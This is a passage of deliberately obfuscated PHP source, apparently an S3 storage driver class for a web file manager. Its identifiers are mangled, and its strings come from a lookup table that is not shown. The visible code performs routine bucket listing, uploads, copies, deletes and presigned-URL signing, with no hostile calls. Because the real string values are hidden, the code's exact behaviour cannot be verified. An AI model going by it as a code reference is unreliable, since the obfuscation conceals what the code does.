array_slice($¤Ôò˜àÍ, 0, $‘İÇîò)) . $ìåà»¡[8]; } while ($‘İÇîò < count($¤Ôò˜àÍ)); $±îÈã£Ñ[count($¤Ôò˜àÍ) - 1] = $ÇÔè¤ˆâ; return $±îÈã£Ñ; } public function getHost() { $ŞÏæüŒÍ =& $_SERVER[”øäÃÍª]; $Å‹İˆ—ú = parse_url(trim($this->domain, $ŞÏæüŒÍ[8])); $şµŠêë¦ = isset($Å‹İˆ—ú[$ŞÏæüŒÍ[205]]) ? $Å‹İˆ—ú[$ŞÏæüŒÍ[205]] : http_type(); $Ç¦‡­ÌÁ = isset($Å‹İˆ—ú[$ŞÏæüŒÍ[206]]) ? $Å‹İˆ—ú[$ŞÏæüŒÍ[206]] : $Å‹İˆ—ú[$ŞÏæüŒÍ[87]]; if (isset($Å‹İˆ—ú[$ŞÏæüŒÍ[207]])) { $Ç¦‡­ÌÁ .= $ŞÏæüŒÍ[4] . $Å‹İˆ—ú[$ŞÏæüŒÍ[207]]; } return $şµŠêë¦ . $ŞÏæüŒÍ[208] . $Ç¦‡­ÌÁ; } public function pathEncode($”‚„ûë) { $şĞ—á˜¾ =& $_SERVER[”øäÃÍª]; return str_replace($şĞ—á˜¾[209], $şĞ—á˜¾[8], rawurlencode($”‚„ûë)); } public function writeLog($ĞõÂ™½× = '', $ëÏ£Ö­ = false) { $±‘¶¥Ø™ =& $_SERVER[”øäÃÍª]; $ŠšàËÈ° = in_array(ACTION, array($±‘¶¥Ø™[210], $±‘¶¥Ø™[211])); if (!$ŠšàËÈ° && !GLOBAL_DEBUG) { return; } $œ¸æ‰åû = $ĞõÂ™½×; static $¹äâƒßÚ = null; if (!$¹äâƒßÚ) { $¹äâƒßÚ = strtoupper($this->getType()); } $ĞõÂ™½× = $¹äâƒßÚ . $±‘¶¥Ø™[212] . $ĞõÂ™½×; if ($ëÏ£Ö­) { $ÑÅĞÉì’ = error_get_last(); if ($ÑÅĞÉì’) { $ĞõÂ™½× = array($ĞõÂ™½×, $ÑÅĞÉì’); } } write_log($ĞõÂ™½×, $±‘¶¥Ø™[213]); if ($ŠšàËÈ°) { throw new Exception($œ¸æ‰åû); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($®ï¾±ÂÅ) { set_timeout(); require_once SDK_DIR . $_SERVER[”øäÃÍª][214]; parent::__construct(); $this->_init($®ï¾±ÂÅ); } public function _init($òÇÙù) { $ò“Ü­¬ =& $_SERVER[”øäÃÍª]; $this->config = $òÇÙù; foreach ($òÇÙù as $ÔÄ Ûù³ => $ìÂ÷‰ì¹) { if (isset($this->{$ÔÄ Ûù³})) { $this->{$ÔÄ Ûù³} = $ìÂ÷‰ì¹; } } $this->endpoint = $òÇÙù[$ò“Ü­¬[215]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $½„²¤ÎŞ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($½„²¤ÎŞ, 0, 7) == $ò“Ü­¬[216]) { $½„²¤ÎŞ = $ò“Ü­¬[217] . substr($½„²¤ÎŞ, 7); } $this->client->setEndpoint($½„²¤ÎŞ); if (in_array(ACTION, array($ò“Ü­¬[210], $ò“Ü­¬[211]))) { $this->client->setExceptions(); } } public function setSignVersion($•–‹ã¹„ = "\x76\x34") { $this->signVer = $•–‹ã¹„; $this->client->setSignVersion($•–‹ã¹„); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ÆÑ£§Éñ) { return null; } } public function isBucketCors() { $Ô¹úˆœú =& $_SERVER[”øäÃÍª]; $ìÓû‡Îâ = $this->getBucketCors(); if (!$ìÓû‡Îâ || !is_array($ìÓû‡Îâ)) { return !1; } if (!is_array($ìÓû‡Îâ[$Ô¹úˆœú[218]])) { $ìÓû‡Îâ[$Ô¹úˆœú[218]] = explode($Ô¹úˆœú[50], $ìÓû‡Îâ[$Ô¹úˆœú[218]]); } if ($ìÓû‡Îâ[$Ô¹úˆœú[219]] != $Ô¹úˆœú[220] || !in_array($Ô¹úˆœú[220], $ìÓû‡Îâ[$Ô¹úˆœú[218]])) { return !1; } $ˆ¶€Ïèª = array_map($Ô¹úˆœú[221], $ìÓû‡Îâ[$Ô¹úˆœú[222]]); if (!is_array($ˆ¶€Ïèª)) { $ˆ¶€Ïèª = array(); } $ÔÁ×»ª‘ = array($Ô¹úˆœú[223], $Ô¹úˆœú[224], $Ô¹úˆœú[225], $Ô¹úˆœú[226], $Ô¹úˆœú[227]); $›Î²¤³ = array_diff($ÔÁ×»ª‘, $ˆ¶€Ïèª); return empty($›Î²¤³); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($×Æûó¼) { return $this->client->setRegion($×Æûó¼); } public function mkfile($„áöïÔ‰, $ïŞ—ã¥ = '', $ŠËöò“ú = REPEAT_RENAME) { $‹µÌ”ÉÜ = $this->setContent($„áöïÔ‰, $ïŞ—ã¥); if ($‹µÌ”ÉÜ !== !1) { return $this->getPathOuter($„áöïÔ‰); } return !1; } public function mkdir($»ÍàË , $ù¼³†Ù = REPEAT_SKIP) { $å¯“¹â =& $_SERVER[”øäÃÍª]; if (empty($»ÍàË ) && $»ÍàË  !== $å¯“¹â[228]) { return !1; } if ($ù¼³†Ù && $this->_isFolder($»ÍàË )) { return $this->getPathOuter($»ÍàË ); } $Ë®¯×õ = $this->setContent($»ÍàË , $å¯“¹â[12], !0); if ($Ë®¯×õ !== !1) { return $this->getPathOuter($»ÍàË ); } return !1; } public function copyFile($½ïáŠø, $”ã–èöÌ, $Ê«Â¥Ãï = array()) { $ß¼¹ÛÎ =& $_SERVER[”øäÃÍª]; $–Í‹Ó = $this->objectMeta($½ïáŠø); if (!$–Í‹Ó) { return !1; } if ($–Í‹Ó[$ß¼¹ÛÎ[79]] <= 1024 * 1024 * 200) { $àÁõˆ­ã = $this->client->copyObject($this->bucket, $½ïáŠø, $this->bucket, $”ã–èöÌ, $ß¼¹ÛÎ[229], $Ê«Â¥Ãï); } else { $àÁõˆ­ã = $this->client->multiCopyObject($this->bucket, $½ïáŠø, $this->bucket, $”ã–èöÌ, $Ê«Â¥Ãï); } $àÁõˆ­ã = $àÁõˆ­ã ? $this->getPathOuter($”ã–èöÌ) : !1; return $àÁõˆ­ã; } public function moveFile($Ê‚ŠŒóÃ, $¹Ìí©·º) { if ($this->copyFile($Ê‚ŠŒóÃ, $¹Ìí©·º)) { $this->delFile($Ê‚ŠŒóÃ); return $this->getPathOuter($¹Ìí©·º); } return !1; } public function delFile($”««áÕ) { return $this->client->deleteObject($this->bucket, $”««áÕ); } public function delFolder($ûœéï¤Î) { $õÙ —»É =& $_SERVER[”øäÃÍª]; if (!$this->exist($ûœéï¤Î)) { return !0; } $this->listItemCache = !1; $ªäãõè‘ = $this->fileList($ûœéï¤Î); $this->listItemCache = !0; $âªˆ“ö = trim($ûœéï¤Î, $õÙ —»É[8]) . $õÙ —»É[8]; if (!empty($ûœéï¤Î) && $ûœéï¤Î !== $õÙ —»É[228] && !in_array($âªˆ“ö, $ªäãõè‘[$õÙ —»É[85]])) { $ªäãõè‘[$õÙ —»É[85]][] = $âªˆ“ö; } $µ—òŸ™¹ = $this->delByBatch($ªäãõè‘[$õÙ —»É[86]]); if (!$µ—òŸ™¹) { return !1; } $µ—òŸ™¹ = $this->delByBatch($ªäãõè‘[$õÙ —»É[85]]); if (!$µ—òŸ™¹) { return !1; } return $this->delFile($âªˆ“ö); } private function delByBatch($İ”º¿Ëâ) { foreach (array_chunk($İ”º¿Ëâ, 1000) as $¦Õ§˜İ†) { $ìıÎ‡°· = $this->client->deleteObjects($this->bucket, $¦Õ§˜İ†); if (!$ìıÎ‡°·) { return !1; } } return !0; } public function rename($ÓÚò¦¾Œ, $ë¾éˆƒş) { return $this->renameObject($ÓÚò¦¾Œ, $ë¾éˆƒş); } public function listPath($¯Ê¼´‚¯, $×œŠÎéù = false) { $ı“¸òÀ¨ =& $_SERVER[”øäÃÍª]; $ÓÆ¸“ì = $this->fileList($¯Ê¼´‚¯, $ı“¸òÀ¨[8], !0); foreach ($ÓÆ¸“ì[$ı“¸òÀ¨[85]] as $Öˆá˜º => $êâ³ÇÛï) { $ÓÆ¸“ì[$ı“¸òÀ¨[85]][$Öˆá˜º] = $this->folderInfo($êâ³ÇÛï, $×œŠÎéù, $êâ³ÇÛï); } foreach ($ÓÆ¸“ì[$ı“¸òÀ¨[86]] as $Öˆá˜º => $êâ³ÇÛï) { $ÓÆ¸“ì[$ı“¸òÀ¨[86]][$Öˆá˜º] = $this->fileInfo($êâ³ÇÛï[$ı“¸òÀ¨[32]], $×œŠÎéù, $êâ³ÇÛï); } return $ÓÆ¸“ì; } protected function infoChildren($¬áÙ¹÷, &$·Ø¹ÅÏù) { $±×èÆø´ =& $_SERVER[”øäÃÍª]; $ÒâúÎÚ† = $this->fileList($¬áÙ¹÷, $±×èÆø´[12], !0); $·Ø¹ÅÏù[$±×èÆø´[81]] += count($ÒâúÎÚ†[$±×èÆø´[85]]); $·Ø¹ÅÏù[$±×èÆø´[80]] += count($ÒâúÎÚ†[$±×èÆø´[86]]); foreach ($ÒâúÎÚ†[$±×èÆø´[86]] as $§ÉÃÙ™Ù) { if (!$§ÉÃÙ™Ù || !$§ÉÃÙ™Ù[$±×èÆø´[79]]) { continue; } $·Ø¹ÅÏù[$±×èÆø´[79]] += $§ÉÃÙ™Ù[$±×èÆø´[79]]; } } private function fileInfo($åúÓîÎ¶, $Ç’ò½åÓ = false, $“…«•ÂÉ = array()) { $ÓÇ£ñ´Û =& $_SERVER[”øäÃÍª]; $Í®ÒÓã² = array($ÓÇ£ñ´Û[32] => $this->pathThis($åúÓîÎ¶), $ÓÇ£ñ´Û[87] => $this->getPathOuter($åúÓîÎ¶), $ÓÇ£ñ´Û[33] => $ÓÇ£ñ´Û[230], $ÓÇ£ñ´Û[166] => $this->ext($åúÓîÎ¶), $ÓÇ£ñ´Û[79] => isset($“…«•ÂÉ[$ÓÇ£ñ´Û[79]]) ? $“…«•ÂÉ[$ÓÇ£ñ´Û[79]] : 0); if ($Ç’ò½åÓ) { return $Í®ÒÓã²; } $Í®ÒÓã²[$ÓÇ£ñ´Û[231]] = $Í®ÒÓã²[$ÓÇ£ñ´Û[88]] = 0; $Í®ÒÓã²[$ÓÇ£ñ´Û[232]] = $Í®ÒÓã²[$ÓÇ£ñ´Û[233]] = !0; if (empty($“…«•ÂÉ)) { $“…«•ÂÉ = $this->objectMeta($åúÓîÎ¶); if (!$“…«•ÂÉ) { return $Í®ÒÓã²; } } if (isset($“…«•ÂÉ[$ÓÇ£ñ´Û[234]]) && $“…«•ÂÉ[$ÓÇ£ñ´Û[234]]) { $Í®ÒÓã²[$ÓÇ£ñ´Û[235]] = $“…«•ÂÉ[$ÓÇ£ñ´Û[234]]; } if (isset($“…«•ÂÉ[$ÓÇ£ñ´Û[204]])) { $Í®ÒÓã²[$ÓÇ£ñ´Û[88]] = $“…«•ÂÉ[$ÓÇ£ñ´Û[204]]; } if (isset($“…«•ÂÉ[$ÓÇ£ñ´Û[79]])) { $Í®ÒÓã²[$ÓÇ£ñ´Û[79]] = $“…«•ÂÉ[$ÓÇ£ñ´Û[79]]; } return $Í®ÒÓã²; } private function folderInfo($‚ «¨ƒù, $•óéé = false, $ÙÎÇô¿Ì = array()) { $ìÎ÷ª“Ÿ =& $_SERVER[”øäÃÍª]; $í‚£ŠİÑ = array($ìÎ÷ª“Ÿ[32] => $this->pathThis($‚ «¨ƒù), $ìÎ÷ª“Ÿ[87] => $this->getPathOuter($ìÎ÷ª“Ÿ[8] . $‚ «¨ƒù), $ìÎ÷ª“Ÿ[33] => $ìÎ÷ª“Ÿ[78]); if ($•óéé) { return $í‚£ŠİÑ; } $í‚£ŠİÑ[$ìÎ÷ª“Ÿ[231]] = $í‚£ŠİÑ[$ìÎ÷ª“Ÿ[88]] = 0; $í‚£ŠİÑ[$ìÎ÷ª“Ÿ[232]] = $í‚£ŠİÑ[$ìÎ÷ª“Ÿ[233]] = !0; if ($‚ «¨ƒù == $ìÎ÷ª“Ÿ[12]) { return $í‚£ŠİÑ; } if (empty($ÙÎÇô¿Ì)) { $ÙÎÇô¿Ì = $this->objectMeta(trim($‚ «¨ƒù, $ìÎ÷ª“Ÿ[8]) . $ìÎ÷ª“Ÿ[8]); } if (isset($ÙÎÇô¿Ì[$ìÎ÷ª“Ÿ[204]])) { $í‚£ŠİÑ[$ìÎ÷ª“Ÿ[231]] = $ÙÎÇô¿Ì[$ìÎ÷ª“Ÿ[204]]; } return $í‚£ŠİÑ; } private function fileList($âÃ£À¢é, $üÖæá‰ = '', $êÊ—›ÙŒ = 0) { $¯Â‰œš½ =& $_SERVER[”øäÃÍª]; $Ì¶¤ÈÚÔ = rtrim($âÃ£À¢é, $¯Â‰œš½[8]) . $¯Â‰œš½[8]; $ñŠê‚¶Ê = $this->listObjs($Ì¶¤ÈÚÔ, null, null, $üÖæá‰); if (!$ñŠê‚¶Ê) { return array($¯Â‰œš½[85] => array(), $¯Â‰œš½[86] => array()); } $‚½ìÎ = $øã•¨‘ = array(); foreach ($ñŠê‚¶Ê[$¯Â‰œš½[236]] as $Ò®ï†¦ò) { $£óõÃ‚ = $Ò®ï†¦ò[$¯Â‰œš½[32]]; if ($£óõÃ‚ == $Ì¶¤ÈÚÔ) { continue; } $À½Ö‚¹‚ = isset($Ò®ï†¦ò[$¯Â‰œš½[79]]) ? $Ò®ï†¦ò[$¯Â‰œš½[79]] : 0; $ËıÖ²Ş¦ = $À½Ö‚¹‚ == 0 && substr($£óõÃ‚, strlen($£óõÃ‚) - 1, 1) == $¯Â‰œš½[8] ? !0 : !1; $this->cacheMethodInfoSet($£óõÃ‚, $ËıÖ²Ş¦, $Ò®ï†¦ò); if ($ËıÖ²Ş¦) { $‚½ìÎ[] = $£óõÃ‚; continue; } $øã•¨‘[] = $êÊ—›ÙŒ ? $Ò®ï†¦ò : $£óõÃ‚; } foreach ($ñŠê‚¶Ê[$¯Â‰œš½[237]] as $Ò®ï†¦ò) { $‚½ìÎ[] = $Ò®ï†¦ò[$¯Â‰œš½[32]]; $this->cacheMethodInfoSet($Ò®ï†¦ò[$¯Â‰œš½[32]], !0); } $this->cacheMethodInfoSet($âÃ£À¢é, !0); return array($¯Â‰œš½[85] => $‚½ìÎ, $¯Â‰œš½[86] => $øã•¨‘); } private function listObjs($©É‚‡, $Ò»Á‡ Ş = null, $‘Õî¸§´ = null, $éØÌóĞ’ = null) { $¹¿À£•Û =& $_SERVER[”øäÃÍª]; $©É‚‡ = trim($©É‚‡, $¹¿À£•Û[8]); $º«ä«¸ç = empty($©É‚‡) && $©É‚‡ !== $¹¿À£•Û[228] ? $¹¿À£•Û[12] : $©É‚‡ . $¹¿À£•Û[8]; return $this->client->getBucket($this->bucket, $º«ä«¸ç, $Ò»Á‡ Ş, $‘Õî¸§´, $éØÌóĞ’, !0); } public function has($Õì×ÈúÂ, $¨Ú“……Ã = false, $ê“Ù£€î = true) { $›Î’àª =& $_SERVER[”øäÃÍª]; $Õì×ÈúÂ = trim($Õì×ÈúÂ, $›Î’àª[8]); $İéõ´«  = empty($Õì×ÈúÂ) && $Õì×ÈúÂ !== $›Î’àª[228] ? $›Î’àª[12] : $Õì×ÈúÂ . $›Î’àª[8]; $ÊíæÊ = null; $·¶£ºÏ = 500; $š–öÊ = $›Î’àª[8]; $ö¹¨æ‡‹ = $ş”Š…ö = array(); while (!0) { $Ãã±ŒÑù = $this->listObjs($Õì×ÈúÂ, $ÊíæÊ, $·¶£ºÏ, $š–öÊ); if (!$Ãã±ŒÑù) { break; } $ÊíæÊ = $Ãã±ŒÑù[$›Î’àª[238]]; $ç·ÊÕ¢­ = $Ãã±ŒÑù[$›Î’àª[236]]; $”ûæ°¬ã = $Ãã±ŒÑù[$›Î’àª[237]]; if (empty($ç·ÊÕ¢­) && empty($”ûæ°¬ã)) { break; } if (count($ç·ÊÕ¢­) == 1 && $ç·ÊÕ¢­[0][$›Î’àª[32]] == $İéõ´« ) { break; } if ($¨Ú“……Ã) { if (count($ç·ÊÕ¢­)) { $ç·ÊÕ¢­ = array_column($ç·ÊÕ¢­, $›Î’àª[32]); $ö¹¨æ‡‹ = array_merge($ö¹¨æ‡‹, $ç·ÊÕ¢­); } if (count($”ûæ°¬ã)) { $”ûæ°¬ã = array_column($”ûæ°¬ã, $›Î’àª[32]); $ş”Š…ö = array_merge($ş”Š…ö, $”ûæ°¬ã); } if ($ÊíæÊ === null) { break; } continue; } if ($ê“Ù£€î) { if (!empty($ç·ÊÕ¢­)) { if (count($ç·ÊÕ¢­) > 1 || isset($ç·ÊÕ¢­[0][$›Î’àª[32]]) && $ç·ÊÕ¢­[0][$›Î’àª[32]] != $İéõ´« ) { return !0; } } } else { if (!empty($”ûæ°¬ã)) { return !0; } } if ($ÊíæÊ === null) { break; } } if ($¨Ú“……Ã) { $ö¹¨æ‡‹ = array_diff($ö¹¨æ‡‹, array($İéõ´« )); $ö¹¨æ‡‹ = count(array_unique($ö¹¨æ‡‹)); $ş”Š…ö = count(array_unique($ş”Š…ö)); return array($›Î’àª[239] => $ö¹¨æ‡‹, $›Î’àª[240] => $ş”Š…ö); } return !1; } public function listAll($ØåŒ½›–) { $È ÷Î½Ï =& $_SERVER[”øäÃÍª]; $ÔÛşÓ•¾ = $this->fileList($ØåŒ½›–, $È ÷Î½Ï[12], !0); $€èÉıÜ = array_to_keyvalue($ÔÛşÓ•¾[$È ÷Î½Ï[86]], $È ÷Î½Ï[32]); foreach ($ÔÛşÓ•¾[$È ÷Î½Ï[85]] as $³ŞæğŒ) { if (is_string($³ŞæğŒ)) { $€èÉıÜ[$³ŞæğŒ] = array($È ÷Î½Ï[79] => 0); } } return $this->listAllFiles($ØåŒ½›–, $€èÉıÜ); } public function canRead($ç‡ƒ¼öÊ) { $Ü°µå¯± =& $_SERVER[”øäÃÍª]; $‚¤ƒÛÊ‡ = $this->client->getAccessControlPolicy($this->bucket, $ç‡ƒ¼öÊ); if (!$‚¤ƒÛÊ‡) { return !1; } return in_array($‚¤ƒÛÊ‡, array($Ü°µå¯±[241], $Ü°µå¯±[242], $Ü°µå¯±[243])) ? !0 : !1; } public function canWrite($ëùğ¿) { $”øšÈ¹ë =& $_SERVER[”øäÃÍª]; $Á™ĞÖ¯ = $this->client->getAccessControlPolicy($this->bucket, $ëùğ¿); if (!$Á™ĞÖ¯) { return !1; } return in_array($Á™ĞÖ¯, array($”øšÈ¹ë[241], $”øšÈ¹ë[242])) ? !0 : !1; } public function getContent($ÜÉÍñ å) { return $this->client->getObject($this->bucket, $ÜÉÍñ å); } public function setContent($å‹ïĞºã, $Ã¾°­ = '', $ÔñÑßŸç = false) { $¬áÒñÌ‘ =& $_SERVER[”øäÃÍª]; $å‹ïĞºã = $ÔñÑßŸç ? trim($å‹ïĞºã, $¬áÒñÌ‘[8]) . $¬áÒñÌ‘[8] : $å‹ïĞºã; $„Æ‡İË = get_file_mime(get_path_ext($å‹ïĞºã)); $Äàç = $this->client->putObject($Ã¾°­, $this->bucket, $å‹ïĞºã, $¬áÒñÌ‘[229], array(), $„Æ‡İË); if (!$Äàç) { return !1; } if ($ÔñÑßŸç) { return !0; } return $Äàç ? !0 : !1; } public function fileSubstr($…ÓÙñŒÜ, $Ò×–¬¼û, $èîÎ—èÑ) { $¼¿îòç = $Ò×–¬¼û + $èîÎ—èÑ - 1; return $this->client->getObject($this->bucket, $…ÓÙñŒÜ, array($_SERVER[”øäÃÍª][244] => "\x62\171\164\x65\163\x3d{$Ò×–¬¼û}\x2d{$¼¿îòç}")); } public function upload($Á˜íÒôİ, $¥Ø¾¤¤‹, $æåß¶µ» = false, $ùÕÒ±ë„ = REPEAT_REPLACE) { $ï·Ò²À‡ =& $_SERVER[”øäÃÍª]; if (!$¥Ø¾¤¤‹ || !@file_exists($¥Ø¾¤¤‹)) { return !1; } $ãóâ¿— = array($ï·Ò²À‡[245] => @md5_file($¥Ø¾¤¤‹)); $’±àóÆ = array($ï·Ò²À‡[246] => get_file_mime(get_path_ext($Á˜íÒôİ))); if (IO::size($¥Ø¾¤¤‹) <= 1024 * 1024 * 200) { $âüˆÒ = $this->client->putObjectFile($¥Ø¾¤¤‹, $this->bucket, $Á˜íÒôİ, $ï·Ò²À‡[229], $ãóâ¿—, $’±àóÆ); return !empty($âüˆÒ) ? $this->getPathOuter($Á˜íÒôİ) : !1; } $¹âÛùÇ½ = $this->client->multiUploadObject($¥Ø¾¤¤‹, $this->bucket, trim($Á˜íÒôİ, $ï·Ò²À‡[8]), $ãóâ¿—, $’±àóÆ); return $¹âÛùÇ½ ? $this->getPathOuter($Á˜íÒôİ) : !1; } public function download($şÜÆÂí, $ªÛÙùà«) { if (!@is_dir($this->pathFather($ªÛÙùà«)) && !IO::mkdir($this->pathFather($ªÛÙùà«))) { return !1; } $íÍÔ´²® = $this->client->getObject($this->bucket, $şÜÆÂí, array(), $ªÛÙùà«); return $íÍÔ´²® !== !1 ? $ªÛÙùà« : !1; } public function link($ÑæØ¢ƒÚ, $äÅ¬¬¤Ó = array()) { return $this->getPreSignedURL($ÑæØ¢ƒÚ, 3600 * 12, $äÅ¬¬¤Ó); } private function getPreSignedURL($¶ş¿ªúŒ, $•ÒÌšªÉ, $ØÍ«Ë®÷ = array(), $ä•Ò¦·ì = "\x47\x45\124") { $›¬ß­Î‹ =& $_SERVER[”øäÃÍª]; $¶ş¿ªúŒ = trim($¶ş¿ªúŒ, $›¬ß­Î‹[8]); if ($this->signVer == $›¬ß­Î‹[247]) { return $this->client->getPreSignedV2URL($this->bucket, $¶ş¿ªúŒ, $•ÒÌšªÉ, $ä•Ò¦·ì, $ØÍ«Ë®÷); } return $this->client->getPreSignedV4URL($this->bucket, $¶ş¿ªúŒ, $•ÒÌšªÉ, array(), $ä•Ò¦·ì, $ØÍ«Ë®÷); } public function fileOut($˜äá¾‡¬, $Êş½–½Ø = false, $ØÚâ·Õš = false, $ô‡ÄŠ‘ø = '') { $öÕà‚úŞ =& $_SERVER[”øäÃÍª]; if ($this->isFileOutServer()) { return $this->fileOutServer($˜äá¾‡¬, $Êş½–½Ø, $ØÚâ·Õš, $ô‡ÄŠ‘ø); } if (!$ØÚâ·Õš) { $ØÚâ·Õš = $this->pathThis($˜äá¾‡¬); } $¸©êÂ¾¥ = get_file_mime(get_path_ext($ØÚâ·Õš)); if ($¸©êÂ¾¥ == $öÕà‚úŞ[248]) { return parent::fileOut($˜äá¾‡¬, $Êş½–½Ø, $ØÚâ·Õš, $ô‡ÄŠ‘ø); } $Ì§‘İÇ° = array($öÕà‚úŞ[249] => $¸©êÂ¾¥); if ($Êş½–½Ø) { $Ì§‘İÇ°[$öÕà‚úŞ[250]] = $öÕà‚úŞ[251] . rawurlencode($ØÚâ·Õš); } else { } $ÑŒæÅì¦ = $this->link($˜äá¾‡¬, $Ì§‘İÇ°); $this->fileOutLink($ÑŒæÅì¦); } public function fileOutServer($ËªÜ²‚µ, $¹ñİÛÃç = false, $©÷¢Ñ³Ø = false, $¾Ø¨Ú˜Š = '') { parent::fileOut($ËªÜ²‚µ, $¹ñİÛÃç, $©÷¢Ñ³Ø, $¾Ø¨Ú˜Š); } public function fileOutImageServer($¿ìç–¢Ù, $š”Ê¤ = 250) { parent::fileOutImage($¿ìç–¢Ù, $š”Ê¤); } public function fileOutLink($ĞÅÌÏ»ë) { $ª–±ÀÌÎ =& $_SERVER[”øäÃÍª]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ª–±ÀÌÎ[67], $ª–±ÀÌÎ[66], $ª–±ÀÌÎ[68])) && !get_url_scheme($this->endpoint) && substr($ĞÅÌÏ»ë, 0, 7) == $ª–±ÀÌÎ[216]) { $ĞÅÌÏ»ë = $ª–±ÀÌÎ[217] . substr($ĞÅÌÏ»ë, 7); } header($ª–±ÀÌÎ[172] . $ĞÅÌÏ»ë); die; } public function hashMd5($›ÄÙÔğÔ, $´½ªÎÎ = '') { $ãÕ÷å”¦ = $this->objectMeta($›ÄÙÔğÔ); if (!$ãÕ÷å”¦) { return !1; } $´½ªÎÎ = $´½ªÎÎ ? $´½ªÎÎ : _get($ãÕ÷å”¦, $_SERVER[”øäÃÍª][252]); return $´½ªÎÎ; } public function uploadFormData($ñı»Ÿèà, $²ÁŠé ó = 3600) { $Ğ»®÷ƒû =& $_SERVER[”øäÃÍª]; if (!$this->_isClientAsync()) { $ÆËÊÕı§ = $this->getPreSignedURL($ñı»Ÿèà, $²ÁŠé ó, array(), $Ğ»®÷ƒû[253]); return array($Ğ»®÷ƒû[206] => str_replace($Ğ»®÷ƒû[216], $Ğ»®÷ƒû[254], $ÆËÊÕı§)); } if (isset($GLOBALS[$Ğ»®÷ƒû[6]][$Ğ»®÷ƒû[92]][$Ğ»®÷ƒû[255]]) && $GLOBALS[$Ğ»®÷ƒû[6]][$Ğ»®÷ƒû[92]][$Ğ»®÷ƒû[255]] == $Ğ»®÷ƒû[228]) { return $this->uploadMultiData($ñı»Ÿèà, $²ÁŠé ó); } if ($this->signVer == $Ğ»®÷ƒû[247]) { return $this->uploadFormDataV2($ñı»Ÿèà, $²ÁŠé ó); } return $this->uploadFormDataV4($ñı»Ÿèà, $²ÁŠé ó); } public function uploadFormDataV2($¯Ä½»øá, $ÀÊ®Û× = 3600) { $‚Ş‡Ëæ =& $_SERVER[”øäÃÍª]; $İÎ½à‰‡ = $this->pathFather($¯Ä½»øá); $›ŒÊ°²· = $this->client->getHttpUploadPostParams($this->bucket, $İÎ½à‰‡, $‚Ş‡Ëæ[229], $ÀÊ®Û×); $¶ŸÃ¨ßö = array_merge((array) $›ŒÊ°²·, array($‚Ş‡Ëæ[256] => $‚Ş‡Ëæ[247], $‚Ş‡Ëæ[206] => $this->getHost())); if ($this->_isClientAsync()) { unset($¶ŸÃ¨ßö[$‚Ş‡Ëæ[256]]); } return $¶ŸÃ¨ßö; } public function uploadFormDataV4($ è´¤Õí, $ÒË•ÓšÄ = 3600) { $·¥ñÇ¦ =& $_SERVER[”øäÃÍª]; $âõè ä = $·¥ñÇ¦[229]; $˜ì»Ğáº = $·¥ñÇ¦[257]; $å³¾“ò = $·¥ñÇ¦[62]; $¢ªœİ·× = gmdate($·¥ñÇ¦[258]); $–òú–ÕŒ = gmdate($·¥ñÇ¦[259]); $âÚîÛŸ = $·¥ñÇ¦[260]; $êĞ†Â¼Ì = $ÒË•ÓšÄ . $·¥ñÇ¦[12]; $äĞ§€Óö = $·¥ñÇ¦[261]; $¦ã¬ŒŒ¥ = array($this->accessKey, $–òú–ÕŒ, $this->region, $å³¾“ò, $âÚîÛŸ); $³ïç¢ß˜ = implode($·¥ñÇ¦[8], $¦ã¬ŒŒ¥); $ÕëƒôÁ¸ = array($·¥ñÇ¦[262] => gmdate($·¥ñÇ¦[263], strtotime($·¥ñÇ¦[264])), $·¥ñÇ¦[265] => array(array($·¥ñÇ¦[266] => $this->bucket), array($·¥ñÇ¦[267], $·¥ñÇ¦[268], $·¥ñÇ¦[12]), array($·¥ñÇ¦[267], $·¥ñÇ¦[269], $·¥ñÇ¦[12]), array($·¥ñÇ¦[270] => $äĞ§€Óö), array($·¥ñÇ¦[271] => $³ïç¢ß˜), array($·¥ñÇ¦[272] => $˜ì»Ğáº), array($·¥ñÇ¦[273] => $¢ªœİ·×), array($·¥ñÇ¦[274] => $êĞ†Â¼Ì))); $©¨‰¬å = base64_encode(json_encode($ÕëƒôÁ¸)); $¬šÎ’š¶ = hash_hmac($·¥ñÇ¦[275], $–òú–ÕŒ, $·¥ñÇ¦[276] . $this->secret, !0); $³ÄÓ¯ˆè = hash_hmac($·¥ñÇ¦[275], $this->region, $¬šÎ’š¶, !0); $Ÿ†Øö«é = hash_hmac($·¥ñÇ¦[275], $å³¾“ò, $³ÄÓ¯ˆè, !0); $ø®“„ºı = hash_hmac($·¥ñÇ¦[275], $âÚîÛŸ, $Ÿ†Øö«é, !0); $¢òµôã = hash_hmac($·¥ñÇ¦[275], $©¨‰¬å, $ø®“„ºı); $¬£Àæ«Ã = array($·¥ñÇ¦[246] => $·¥ñÇ¦[12], $·¥ñÇ¦[270] => $äĞ§€Óö, $·¥ñÇ¦[277] => $©¨‰¬å, $·¥ñÇ¦[271] => $³ïç¢ß˜, $·¥ñÇ¦[272] => $˜ì»Ğáº, $·¥ñÇ¦[273] => $¢ªœİ·×, $·¥ñÇ¦[274] => $êĞ†Â¼Ì, $·¥ñÇ¦[278] => $¢òµôã, $·¥ñÇ¦[256] => $·¥ñÇ¦[247], $·¥ñÇ¦[206] => $this->getHost()); if ($this->_isClientAsync()) { unset($¬£Àæ«Ã[$·¥ñÇ¦[256]]); } return $¬£Àæ«Ã; } public function uploadMultiData($Ú¥ôÄ‚Š, $Ÿ¸‚æ‚Õ = 3600) { $Š›ó€± =& $_SERVER[”øäÃÍª]; $ÙÀó•° = $this->signVer == $Š›ó€±[247] ? gmdate($Š›ó€±[279]) : gmdate($Š›ó€±[280]); $²ªüÁ„ = array(); $Ûİæ»­Æ = $this->client->getUploadId($this->bucket, $Ú¥ôÄ‚Š, $²ªüÁ„); if (!$Ûİæ»­Æ) { return !1; } $€Êº–³ = array($Š›ó€±[281] => $Ûİæ»­Æ, $Š›ó€±[206] => $this->getHost() . $Š›ó€±[8] . $this->pathEncode($Ú¥ôÄ‚Š), $Š›ó€±[282] => 